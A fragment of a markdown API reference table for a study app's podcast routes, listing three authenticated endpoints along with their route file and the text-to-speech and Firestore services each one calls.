| GET | `/api/podcast/audio-status/{doc_id}` | required | `api/study_app/routes/podcast.py` | Firestore |
| POST | `/api/podcast/episode-audio` | required | `api/study_app/routes/podcast.py` | Google Cloud TTS (whole episode as ONE MP3 track, on cache miss), Firestore |
| POST | `/api/podcast/segment-audio` | required | `api/study_app/routes/podcast.py` | Google Cloud TTS (whole episode, 1 call) **or** Gemini TTS (≤2,250-char batches) **or** ElevenLabs (1 call/segment) — on cache miss only — plus Firestore |

"Required" auth means `Depends(require_user)` — see §3.
